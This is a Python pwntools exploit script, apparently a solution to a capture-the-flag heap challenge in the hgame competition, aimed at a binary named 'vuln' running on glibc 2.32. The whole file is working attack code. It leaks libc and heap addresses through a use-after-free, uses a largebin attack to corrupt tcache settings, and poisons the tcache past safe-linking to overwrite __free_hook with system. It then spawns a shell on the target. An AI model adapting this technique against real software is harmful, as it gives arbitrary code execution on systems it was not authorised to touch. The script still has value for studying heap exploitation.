from pwn import *
import time

context.log_level = 'debug'

debug = True

elf = ELF("./vuln")
libc = ELF("/home/yrl/glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc.so.6")
if debug:
    io = process("./vuln")
else:
    io = remote("week-3.hgame.lwsec.cn", 32109)


def ddebug():
    gdb.attach(io)
    pause()


rop = ROP('./vuln')
roplibc = ROP("/home/yrl/glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc.so.6")


def add(idx, size, content):
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Size: ", str(size).encode())

def delete(idx):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b"Index: ", str(idx).encode())


def edit(idx,content):
    io.sendlineafter(b">", b"3")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendafter(b"Content: ", content)
    
def show(idx):
    io.sendlineafter(b">", b"4")
    io.sendlineafter(b"Index: ", str(idx).encode())


add(0, 0x528, b"abc")
add(1, 0x500, b"abc")
add(2, 0x518, b"abc")
add(3, 0x500, b"abc")

delete(0)
add(5, 0x538, b"abc")
show(0)
libcmain_offset = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
success("main_arena -> " + hex(libcmain_offset))
libc.address = libcmain_offset - 0x1e4030
success("libc address -> " + hex(libc.address))
free_hook_address = libc.symbols["__free_hook"]
success("free_hook_address -> " + hex(free_hook_address))
system = libc.symbols["system"]
success("system -> " + hex(system))
tcachebins = libc.address + 0x1e32d0
success("tcachebins -> " + hex(tcachebins))

# leak heap_ptr
edit(0, b'a'*0x10)
show(0)
io.recvuntil(b"a"*0x10)
heap_ptr = u64(io.recvn(6).ljust(8, b"\x00"))
success("heap_ptr -> " + hex(heap_ptr))

# recover largebin
edit(0, p64(libcmain_offset)*2)

# make unsortedbin size < largebin size
delete(3)

# modify largebin bk_nextsize = target
edit(0, p64(libcmain_offset)*2 + p64(0) + p64(tcachebins-0x20))
# trigger largebin attack , modify mp_tcache_bins to a big number
add(5, 0x538, b"abc")

# tcachebin attack
add(6, 0x550, b"abc")
add(7, 0x550, b"abc")
delete(7)
delete(6)

success("free_hook_address_enc -> " + hex(free_hook_address^((heap_ptr+0x2410)>>12)))

edit(6, p64(free_hook_address^((heap_ptr+0x2410)>>12)))
#ddebug()
add(6, 0x550, b"abc")
add(7, 0x550, b"abc")
edit(7, p64(system))
edit(6, b'/bin/sh\x00')
delete(6)
io.interactive()
